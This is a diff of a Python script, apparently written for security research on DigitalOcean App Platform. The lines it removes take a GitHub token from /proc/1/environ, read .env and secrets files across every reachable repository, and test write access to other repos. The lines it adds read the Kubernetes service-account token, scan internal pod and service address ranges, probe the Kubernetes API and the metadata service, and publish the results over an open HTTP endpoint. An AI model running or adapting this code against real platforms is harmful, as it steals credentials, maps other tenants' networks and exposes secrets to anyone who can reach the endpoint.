@@ -1,156 +1,169 @@
-import json, os, urllib.request, urllib.error, ssl, re, glob
+"""
+Runtime network probe for App Platform cross-app testing.
+Serves probe results on HTTP and runs network discovery on startup.
+"""
+import json, os, socket, time, urllib.request, urllib.error, ssl, re, threading
+from http.server import HTTPServer, BaseHTTPRequestHandler
 
-r = {}
-ctx = ssl.create_default_context()
+results = {"status": "probing..."}
 
-# 1. Find token from /proc/1/environ
-token = None
-try:
-    environ = open('/proc/1/environ').read()
-    match = re.search(r'x-access-token:([^@\x00]+)@', environ)
-    if match:
-        token = match.group(1)
-except:
-    pass
+def run_probe():
+    global results
+    r = {}
 
-if not token:
-    r['error'] = 'No token'
-    print(json.dumps(r, indent=2))
-    exit()
-
-r['token_prefix'] = token[:12] + '...'
-
-headers = {
-    'Authorization': f'token {token}',
-    'Accept': 'application/vnd.github+json',
-    'User-Agent': 'probe/1.0'
-}
-
-def gh(path):
-    try:
-        req = urllib.request.Request(f'https://api.github.com{path}', headers=headers)
-        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
-        return {'s': resp.status, 'd': json.loads(resp.read().decode())}
-    except urllib.error.HTTPError as e:
-        return {'s': e.code, 'e': e.read().decode(errors='replace')[:300]}
-    except Exception as e:
-        return {'err': str(e)[:100]}
-
-# 2. List ALL installation repos
-ir = gh('/installation/repositories?per_page=100')
-repos = ir.get('d', {}).get('repositories', [])
-r['total_repos'] = len(repos)
-
-# 3. For EACH repo: try to read contents (root dir) and check private status
-r['repo_access'] = {}
-for repo in repos:
-    full_name = repo.get('full_name', '?')
-    is_private = repo.get('private', False)
-
-    entry = {
-        'private': is_private,
-        'permissions': repo.get('permissions', {}),
+    # 1. Runtime identity
+    r['runtime'] = {
+        'uid': os.getuid(),
+        'hostname': socket.gethostname(),
+        'pid': os.getpid(),
     }
 
-    # Try to read root contents
-    contents = gh(f'/repos/{full_name}/contents/')
-    if contents.get('s') == 200:
-        files = contents.get('d', [])
-        entry['can_read_contents'] = True
-        entry['files'] = [f.get('name', '?') for f in files if isinstance(f, dict)][:20]
-        entry['file_count'] = len(files)
+    # Network env vars
+    env_keys = {}
+    for k, v in os.environ.items():
+        if any(x in k.upper() for x in ['KUBE', 'SERVICE', 'HOST', 'PORT', 'IP', 'DNS', 'CLUSTER', 'POD', 'NODE', 'NET', 'DIGITAL', 'APP']):
+            env_keys[k] = v[:200]
+    r['network_env'] = env_keys
 
-        # Try to read a specific file (README or any file)
-        for f in files:
-            if isinstance(f, dict):
-                fname = f.get('name', '')
-                if fname.lower() in ['readme.md', '.env', '.env.example', 'config.json', 'secrets.json', '.gitignore']:
-                    file_result = gh(f'/repos/{full_name}/contents/{fname}')
-                    if file_result.get('s') == 200:
-                        fd = file_result.get('d', {})
-                        if isinstance(fd, dict) and fd.get('encoding') == 'base64':
-                            import base64
-                            content = base64.b64decode(fd.get('content', '')).decode(errors='replace')
-                            entry[f'file_{fname}'] = content[:500]
-    else:
-        entry['can_read_contents'] = False
-        entry['contents_error'] = contents.get('e', str(contents.get('s', '?')))[:100]
-
-    # Try to read commits
-    commits = gh(f'/repos/{full_name}/commits?per_page=1')
-    if commits.get('s') == 200:
-        entry['can_read_commits'] = True
-        cd = commits.get('d', [])
-        if cd and isinstance(cd, list):
-            entry['last_commit'] = cd[0].get('commit', {}).get('message', '?')[:100]
-    else:
-        entry['can_read_commits'] = False
-
-    r['repo_access'][full_name] = entry
-
-# 4. Try to WRITE to a repo (create an issue as proof, then delete it)
-r['write_tests'] = {}
-
-# Try creating a file in the build repo
-import base64
-try:
-    data = json.dumps({
-        'message': 'test write access',
-        'content': base64.b64encode(b'test').decode()
-    }).encode()
-    req = urllib.request.Request(
-        f'https://api.github.com/repos/rollingWaves/build-imds-test/contents/_write_test.txt',
-        data=data,
-        headers={**headers, 'Content-Type': 'application/json'},
-        method='PUT'
-    )
-    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
-    r['write_tests']['create_file'] = {'s': resp.status}
-    resp.read()
-    # Clean up - delete it
+    # 2. Own IPs + routes
+    import subprocess as sp
     try:
-        # Get SHA first
-        get_resp = gh('/repos/rollingWaves/build-imds-test/contents/_write_test.txt')
-        sha = get_resp.get('d', {}).get('sha', '')
-        if sha:
-            del_data = json.dumps({'message': 'cleanup', 'sha': sha}).encode()
-            del_req = urllib.request.Request(
-                f'https://api.github.com/repos/rollingWaves/build-imds-test/contents/_write_test.txt',
-                data=del_data,
-                headers={**headers, 'Content-Type': 'application/json'},
-                method='DELETE'
-            )
-            urllib.request.urlopen(del_req, timeout=10, context=ctx).read()
-            r['write_tests']['delete_file'] = 'cleaned up'
+        out = sp.run(['ip', 'addr'], capture_output=True, text=True, timeout=5)
+        r['ip_addr'] = out.stdout[:2000]
+    except Exception as e:
+        r['ip_addr_err'] = str(e)
+    try:
+        out = sp.run(['ip', 'route'], capture_output=True, text=True, timeout=5)
+        r['routes'] = out.stdout[:1000]
     except:
         pass
-except urllib.error.HTTPError as e:
-    r['write_tests']['create_file'] = {'s': e.code, 'e': e.read().decode()[:200]}
-except Exception as e:
-    r['write_tests']['create_file'] = {'err': str(e)[:100]}
+    try:
+        r['resolv_conf'] = open('/etc/resolv.conf').read()[:500]
+    except:
+        pass
 
-# 5. Try to create an issue in ANOTHER repo
-try:
-    data = json.dumps({
-        'title': 'DO App Platform build token scope test',
-        'body': 'This issue was created from a DO App Platform build to test token scope. Safe to delete.'
-    }).encode()
-    req = urllib.request.Request(
-        f'https://api.github.com/repos/rollingWaves/build-bp-test/issues',
-        data=data,
-        headers={**headers, 'Content-Type': 'application/json'},
-        method='POST'
-    )
-    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
-    issue = json.loads(resp.read().decode())
-    r['write_tests']['create_issue_other_repo'] = {
-        's': resp.status,
-        'issue_number': issue.get('number', '?'),
-        'url': issue.get('html_url', '?')
-    }
-except urllib.error.HTTPError as e:
-    r['write_tests']['create_issue_other_repo'] = {'s': e.code, 'e': e.read().decode()[:200]}
-except Exception as e:
-    r['write_tests']['create_issue_other_repo'] = {'err': str(e)[:100]}
+    # 3. Namespace / SA token
+    r['k8s'] = {}
+    for f in ['namespace', 'token', 'ca.crt']:
+        path = f'/var/run/secrets/kubernetes.io/serviceaccount/{f}'
+        try:
+            data = open(path).read()
+            if f == 'token':
+                r['k8s'][f] = data[:50] + '...' if len(data) > 50 else data
+            else:
+                r['k8s'][f] = data[:500]
+        except Exception as e:
+            r['k8s'][f] = str(e)[:100]
 
-print(json.dumps(r, indent=2, default=str))
+    # 4. DNS resolution
+    r['dns'] = {}
+    dns_targets = [
+        'kubernetes.default.svc.cluster.local',
+        'kube-dns.kube-system.svc.cluster.local',
+    ]
+    for target in dns_targets:
+        try:
+            r['dns'][target] = [str(x[4]) for x in socket.getaddrinfo(target, None)][:3]
+        except Exception as e:
+            r['dns'][target] = str(e)[:100]
+
+    # 5. Quick connect helper
+    def qc(ip, port, timeout=1.5):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(timeout)
+            result = s.connect_ex((ip, port))
+            s.close()
+            return result
+        except:
+            return -1
+
+    # 6. Pod CIDR scan (10.244.x.x) — look for other apps
+    r['pod_scan'] = {}
+    ports = [8080, 80, 443, 3000, 5000]
+    for sub in range(0, 15):
+        for host in [1, 2, 3, 4, 5, 10, 20, 50, 100, 150, 200, 250]:
+            ip = f'10.244.{sub}.{host}'
+            for port in ports:
+                rc = qc(ip, port, timeout=0.5)
+                if rc == 0:
+                    r['pod_scan'][f'{ip}:{port}'] = 'OPEN'
+                    # Try HTTP fetch
+                    try:
+                        resp = urllib.request.urlopen(f'http://{ip}:{port}/', timeout=3)
+                        body = resp.read().decode(errors='replace')[:500]
+                        hdrs = dict(resp.headers)
+                        r['pod_scan'][f'{ip}:{port}_resp'] = {'body': body, 'headers': hdrs}
+                    except Exception as e:
+                        r['pod_scan'][f'{ip}:{port}_err'] = str(e)[:200]
+
+    # 7. Service CIDR scan (10.245.x.x)
+    r['svc_scan'] = {}
+    for host in range(1, 30):
+        ip = f'10.245.0.{host}'
+        for port in [443, 80, 8080, 53]:
+            rc = qc(ip, port, timeout=0.5)
+            if rc == 0:
+                r['svc_scan'][f'{ip}:{port}'] = 'OPEN'
+
+    # Also scan 10.245.{1-5}.x
+    for sub in range(1, 6):
+        for host in [1, 10, 50, 100, 150, 200]:
+            ip = f'10.245.{sub}.{host}'
+            for port in [80, 443, 8080]:
+                rc = qc(ip, port, timeout=0.5)
+                if rc == 0:
+                    r['svc_scan'][f'{ip}:{port}'] = 'OPEN'
+
+    # 8. /proc/net/tcp
+    r['connections'] = {}
+    try:
+        tcp = open('/proc/net/tcp').read()
+        r['connections']['tcp_lines'] = len(tcp.strip().split('\n'))
+        r['connections']['tcp'] = tcp[:2000]
+    except:
+        pass
+
+    # 9. Try to reach the K8s API
+    r['k8s_api'] = {}
+    rc = qc('10.245.0.1', 443, timeout=2)
+    r['k8s_api']['connect'] = f'errno={rc}'
+    if rc == 0:
+        try:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            req = urllib.request.Request('https://10.245.0.1:443/version')
+            resp = urllib.request.urlopen(req, timeout=5, context=ctx)
+            r['k8s_api']['version'] = resp.read().decode()[:500]
+        except Exception as e:
+            r['k8s_api']['err'] = str(e)[:200]
+
+    # 10. Try IMDS
+    r['imds'] = {}
+    rc = qc('169.254.169.254', 80, timeout=2)
+    r['imds']['connect'] = f'errno={rc}'
+
+    # 11. Internal DO ranges
+    r['internal'] = {}
+    for ip in ['10.116.0.1', '10.116.0.2', '10.116.0.3', '100.65.67.229', '10.10.0.5']:
+        rc = qc(ip, 443, timeout=1)
+        r['internal'][f'{ip}:443'] = f'errno={rc}'
+
+    results = r
+
+# Run probe in background thread
+t = threading.Thread(target=run_probe, daemon=True)
+t.start()
+
+class H(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-Type", "application/json")
+        self.end_headers()
+        self.wfile.write(json.dumps(results, indent=2, default=str).encode())
+    def log_message(self, format, *args):
+        pass
+
+port = int(os.environ.get('PORT', 8080))
+HTTPServer(("0.0.0.0", port), H).serve_forever()
